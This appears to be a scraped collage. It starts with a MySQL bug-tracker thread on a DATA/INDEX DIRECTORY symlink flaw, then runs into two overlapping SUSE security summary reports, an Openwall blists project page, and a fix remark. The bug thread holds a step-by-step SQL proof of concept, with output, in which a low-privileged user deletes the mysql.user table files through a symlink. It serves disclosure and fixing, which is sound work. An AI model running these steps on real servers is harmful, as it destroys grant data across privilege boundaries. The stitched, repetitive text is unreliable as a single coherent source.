Description:
This was detected during analyze of [Bug#39277](https://bugs.mysql.com/bug.php?id=39277) (symlink.test fails on Debian), later (Problems with symbolic links), later (Creation of table with data and/or index files in data home directory succeeds).

It was not fixed with the bugfix for that bug. So the drop problem is split out here.

How to repeat:
Please find my comment and test case of 22 Nov 2008 in that bug report.
```

[24 Nov 2008 14:42]
Ingo Strüwing
```
Copied triage settings from [Bug#39277](https://bugs.mysql.com/bug.php?id=39277) as this is a split out from there.
```

```
The fact that the problem exists since day one doesn't reduce its severity.

The point with the "write access" might be confused. UNIX/Linux is a multi-user system. It has a permission system which can limit what a user can do on the system. It is no big problem to set permissions so that a certain user cannot read nor write datadir. As such he cannot do much harm to the database installation.

But usually every user has read/write access to /tmp. The problem I found thus requires an arbitrary account on the machine (with write access to /tmp, but neither read nor write acces to datadir) and an database account with CREATE and DROP privileges in an arbirtary database (schema).

With this setup the user should not be able to do any harm to databse objects outside of that database (schema). Write access to his home directory and /tmp should not be sufficient to influence the databases from the shell level either.

So what does it mean: "such users can mess-up the server in
any way possible"? What possible attacks can he carry out with his limited permissions?

One thing he can do is this (you may replace MYSQL_TMP_DIR with /tmp or the user's home directory):

#
# Test #2 - Drop mysql.user with CREATE|DROP privileges on another DB.
#
CREATE USER 'mysql_user1';
#
# Create a database for mysql_user1 user's tables.
#
CREATE DATABASE mysql_db1;
#
# Grant mysql_user1 to create and drop tables in mysql_db1.
#
GRANT CREATE, DROP ON mysql_db1.* TO 'mysql_user1';
#
# Show which users we have in the table mysql.user.
#
SELECT User FROM mysql.user;
User
mysql_user1
root
root
root
#
# Connection con1 - mysql_user1
#
# Make a directory [bug39277](https://bugs.mysql.com/bug.php?id=39277) somewhere, for example in MYSQL_TMP_DIR.
#
# Create table mysql_db1.user, with its files in [bug39277](https://bugs.mysql.com/bug.php?id=39277).
#
CREATE TABLE mysql_db1.user (c1 INT) ENGINE=MyISAM
DATA DIRECTORY='MYSQL_TMP_DIR/bug39277'
      INDEX DIRECTORY='MYSQL_TMP_DIR/bug39277';
#
# Remove the table files and the directory [bug39277](https://bugs.mysql.com/bug.php?id=39277).
#
# Make a symlink from 'mysql' database to MYSQL_TMP_DIR/bug39277.
#
# Drop table mysql_db1.mysql with the files from mysql.user.
DROP TABLE mysql_db1.user;
#
# Connection default - root
#
# Show which users we have in table mysql.user.
# This does work as the table is still open in the table cache.
#
SELECT User FROM mysql.user;
User
mysql_user1
root
root
root
#
# Close table mysql.user.
#
FLUSH TABLE mysql.user;
#
# Show which users we have in the table mysql.user. Bummer!
#
SELECT User FROM mysql.user;
ERROR HY000: Can't find file: 'user' (errno: 2)
#
# Due to missing table files, we cannot drop the user any more.
#
DROP USER 'mysql_user1';
ERROR HY000: Can't find file: 'user' (errno: 2)
#
# Cleanup.
#
DROP DATABASE mysql_db1;

IMHO this should not be allowed. DROP should refuse to drop a table if it uses symlinks that resolve into datadir. The attempt should even be reported to the error log.

it's a duplicate of [Bug#32167](https://bugs.mysql.com/bug.php?id=32167)
(and is possible because of a bug in a fix for [bug#32167](https://bugs.mysql.com/bug.php?id=32167)).

Was this problem fixed in any version?  This was marked as dupe of [bug #32167](https://bugs.mysql.com/bug.php?id=32167), but I don't see any comment there indicating related change.  Thanks!

at least it's not fixed in the current 5.1, I've just tested

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- OpenOffice\_org
Specially crafted ppt files could cause a heap based buffer overflow in
OpenOffice\_org Impress. Attackers could exploit that to crash
OpenOffice\_org or potentially even execute arbitrary code
(CVE-2010-2935, CVE-2010-2936).
This update also fixes numerous non-security bugs. Please refer to the
package changelog for details.

- libHX13/libHX18/libHX22
This update fixes a heap-based buffer overflow in HX\_split() of libHX.
(CVE-2010-2947)
Affected Products: SLE11, SLE11-SP1, openSUSE 11.1-11.3
- mipv6d
the mipv6 daemon did not check the origin of netlink messages, therefore
allowing local users to spoof messages (CVE-2010-2522).
remote attackers could cause buffer overflows in mipv6d (CVE-2010-2523).
Affected Products: openSUSE 11.1-11.3, SLE11, SLE11-SP1
- mysql
- local users could delete data files for tables of other users
(CVE-2010-1626).
- authenticated users could gather information for tables they
should not have access to (CVE-2010-1849)
- authenticated users could crash mysqld (CVE-2010-1848)
- authenticated users could potentially execute arbitrary code as
the user running mysqld (CVE-2010-1850)

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

It seems 5.1.46 also fixes:
  <http://bugs.mysql.com/bug.php?id=40980>

Which is another sequel to the DATA/INDEX DIRECTORY issues like
CVE-2008-2079, CVE-2008-4098, CVE-2008-7247 or CVE-2009-4030.

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- mysql
- local users could delete data files for tables of other users
(CVE-2010-1626).
- authenticated users could gather information for tables they
should not have access to (CVE-2010-1849)
- authenticated users could crash mysqld (CVE-2010-3683,
CVE-2010-3681, CVE-2010-1848)
- authenticated users could bypass intended access restrictions
(CVE-2008-7247, CVE-2009-4030)
Affected Products: SLES9, SLE10-SP3, SLE11, SLE11-SP1, openSUSE 11.1,
openSUSE 11.2
- dhcp
ISC DHCP can be crashed with a single dhcpv6 packet.
CVE-2010-3611 has been assigned to this issue.
Additionally a dhcrelay crash when receiving packets on interfaces
without assigned IPv4 address has been fixed as well as an infinite
loop in dhcpd.
Affected Products: openSUSE 11.3
- monotone
Remote attackers could crash a monotone server via an empty argument to
the 'mtn' command (CVE-2010-4098).
Affected Products: openSUSE 11.3
- moodle
This update of moodle fixes:
- CVE-2010-4207: CVSS v2 Base Score: 4.3 (MEDIUM)
Cross-site scripting vulnerability in the Flash component infrastructure
in YUI allows remote attackers to inject arbitrary web script or HTML via
charts/assets/charts.swf.
- CVE-2010-4208: CVSS v2 Base Score: 4.3 (MEDIUM)
Cross-site scripting vulnerability in the Flash component infrastructure
in YUI allows remote attackers to inject arbitrary web script or HTML via
uploader/assets/uploader.swf.
- CVE-2010-4209: CVSS v2 Base Score: 4.3 (MEDIUM)
Cross-site scripting vulnerability in the Flash component infrastructure
in YUI allows remote attackers to inject arbitrary web script or HTML via
swfstore/swfstore.swf.
Affected Products: openSUSE 11.1
- openssl/libopenssl-devel
Specially crafted responses from SSL servers could cause a double-free bug
in openssl's client implementation. Therefore a malicious SSL servers could
crash client-side code that uses the openssl library for its SSL connection.
(CVE-2010-2939: CVSS v2 Base Score: 4.3 (MEDIUM))
Affected Products: SLE10-SP3, SLE11, SLE11-SP1, openSUSE 11.1, 11.2, 11.3

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
